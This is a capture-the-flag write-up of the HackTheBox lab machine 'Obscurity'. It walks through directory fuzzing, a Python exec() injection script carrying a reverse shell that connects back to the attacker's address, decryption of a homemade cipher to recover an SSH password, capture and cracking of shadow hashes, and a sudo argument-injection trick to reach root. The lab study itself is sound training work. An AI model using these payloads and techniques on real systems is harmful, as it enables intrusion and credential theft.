---
title: "HackTheBox: Obscurity"
date: "2020-05-09"
author: frosty
categories:
  - "writeups"
tags:
  - "hackthebox"
---

![Image](assets/img/writeups/hackthebox/obscurity/htb-obscurity.png)

* * *

## Host Enumeration

As usual, we begin with an nmap scan to identify listening services.

- 22: OpenSSH 7.6p1
- 80: Closed HTTP
- 8080: BadHTTPServer

![Image](assets/img/writeups/hackthebox/obscurity/image-10.png)

## Host enumeration - 8080

Interestingly, the version of this service is BadHTTPServer... I am unfamiliar with this service. Due to the nature of HTTP, we navigate to it using the browser and we see a note; their motto is _security through obscurity!_ Interesting for sure. In my secure software development class at university, we were taught that security by obscurity offers no security, and it's only a matter of time until an attacker finds out.

When scrolling down a little, there is a second note from the developers. The web server code is in the **SuperSecureServer.py** file, in the secret development directory. This is where security by obscurity comes into action. The secret development directory is only supposed to be known to those authorized, however we are hackers and can use enumeration tools ;)

![Image](assets/img/writeups/hackthebox/obscurity/image-11-1024x187.png)

![Image](assets/img/writeups/hackthebox/obscurity/image-12.png)

Lets use wfuzz to try and find the directory which SuperSecureServer.py is hidden in. The command can be seen below. The `FUZZ` is the placeholder/ field that is fuzzed by the wordlist. We place `/SuperSecureServer.py` afterwards so that when the correct directory is placed in the field, then we should get a HTTP 200 OK response.

```sh
$ wfuzz -w '/usr/share/wordlists/dirb/common.txt' \
-u 'http://10.10.10.168:8080/FUZZ/SuperSecureServer.py' \
--hc 404,500 -c
```

![Image](assets/img/writeups/hackthebox/obscurity/image-13.png)

Bingo! The secret directory is `develop`. Not so secret after all. Alright, now we have access to the software running the web server. Thankfully Python is an interpreted code language, and does not always get compiled. Hence, we are able to read the source code without any binary reversing.

* * *

## Getting the initial shell

We have to do a code review, perhaps there is some insecure software development which we can exploit. It seems that the web server serves documents which the user controls and is executed using the unsafe `exec()` function.

![Image](assets/img/writeups/hackthebox/obscurity/image-15.png)

Alright, it's time to buckle up and see if we can get RCE by escaping the `exec()`. This is the idea:

```py
#!/usr/bin/env python3
import requests
import urllib

url = 'http://10.10.10.168:8080/'
path = 'foo'
payload = urllib.parse.quote(path)
resp = requests.get(url+payload)
```

So we just need to change the `path` to get RCE.

```py
# the desired output
# ' import os;os.system("ping -c 2 10.10.15.95") a='
# together:
path = '\'' + '\nimport os;os.system("ping -c 2 10.10.15.95")\na=\''
```

![Image](assets/img/writeups/hackthebox/obscurity/image-17.png)

So all we need to do to get the reverse shell is to place some Python reverse shellcode (Credit to) [pentest monkey reverse shell cheat sheet](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet).

```py
#!/usr/bin/env python3
import requests
import urllib

url = 'http://10.10.10.168:8080/'
path = '\'' + '\nimport socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.15.95",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"])\na=\''

print("[+] Sending payload. \n[+] Check netcat listener")
payload = urllib.parse.quote(path)
resp = requests.get(url+payload)
```

![Image](assets/img/writeups/hackthebox/obscurity/image-18.png)

* * *

## Pivot from www-data to Robert

The www-data is able to read the files (but not user.txt!) in the `Robert` home directory. There are some interesting files. I guess we will have to do our second code review, this time against SuperSecureCrypt.py

- check.txt
- out.txt
- passwordreminder.txt
- SuperSecureCrypt.py

![Image](assets/img/writeups/hackthebox/obscurity/image-19.png)

> Don't roll your own crypto
>
> Lecturer at Napier University

![Image](assets/img/writeups/hackthebox/obscurity/image-21.png)

OK so, we see that the encrypt function looks like a ROT13 cipher, but rotation by 255 rather than 13, using a key that is the length of the cipher text. Welcome to a crypto CTF challenge!

Pretty much, what we have to do is use the out.txt as an input file, use the contents of check.txt as the key, and use the `-d` flag to decrypt out.txt. This will give is the encryption key:

```sh
$ python3 SuperSecureCrypt.py \
-i out.txt
-k 'Encrypting this file with your key should result in out.txt, make sure your key is correct!' \
-o passwd-dec.txt \
-d \
&& cat passwd-dec.txt
alexandrovichalexandrovichalexandrovichalexandrovichalexandrovichalexandrovichalexandrovich
```

So, now we can use the key to decrypt the password.

```sh
$ python3 SuperSecureCrypt.py \
-i passwordreminder.txt
-k 'alexandrovichalexandrovichalexandrovichalexandrovichalexandrovichalexandrovichalexandrovich'
-o passwordreminder-out.txt
-d \
&& cat passwordreminder-out.txt
SecThruObsFTW
```

![Image](assets/img/writeups/hackthebox/obscurity/image-22.png)

Now we are able to log in to the SSH service with `robert:SecThruObsFTW` credentials.

* * *

## Escalating to Root

When executing `sudo -l` we are able to see whether Robert can execute any scripts as root.

![Image](assets/img/writeups/hackthebox/obscurity/image-24-1024x121.png)

Robert can execute BetterSSH.py as root. There is a bit of a theme developing; it seems that we have to code review again now. We see a big no-no. Instead of using the native SSH binary, the creators created their own - which is supposed to be better. However, there is a gaping mistake in it. It writes the hashes of the **shadow** file to /tmp/SSH/ for 0.1 seconds. Sounds secure, but we can exploit this. We must execute the script as root because otherwise it is not possible to read the shadow hashes.

![Image](assets/img/writeups/hackthebox/obscurity/image-25.png)

There are actually two methods here. The second method I didn't know until I discussed it with another player.

### Method 1 to get root

As the root hash is only placed in the /tmp/SSH directory for 0.1 seconds, we need to create a loop that will cat all files.

```sh
while true; do cat /tmp/SSH/* ; done
```

In a second terminal, we must execute BetterSSH.py as root (using Robert the user) and login with our credentials. Then the root hash will be printed in the first terminal. We can use John to crack the password.

```sh
$ john --wordlist=/usr/share/wordlists/rockyou.txt root.hash
mercedes
```

![Image](assets/img/writeups/hackthebox/obscurity/image-26.png)

![Image](assets/img/writeups/hackthebox/obscurity/image-27.png)

We can use the password to switch to the root user in the robert SSH session. While the password could have been brute forced straight away, we cannot login to root through SSH externally, so that would have failed.

![Image](assets/img/writeups/hackthebox/obscurity/image-28.png)

## Method 2 to get root

So, when we run binaries as sudo we can also execute commands as another user, e.g.
`sudo -u foo script.sh` to run script.sh as foo user. We can do:
`-u root cat /root/root.txt` in the BetterSSH shell to get the root flag.

![Image](assets/img/writeups/hackthebox/obscurity/image-29.png)

We must do a code review to understand _why_ this really works. The screenshot below shows the code that is executed when a user types a command. The key line is highlighted in the orange box.

The BetterSSH is running under root context. To enable user permissions, `sudo -u <username>` is used to execute commands as the authenticated user. However, when we use the command `-u root $command` then we place it in `sudo -u robert -u root $command`. The sudo binary takes the root user, and executes `cat /root/root.txt` to give us the root flag.

![Image](assets/img/writeups/hackthebox/obscurity/image-31.png)
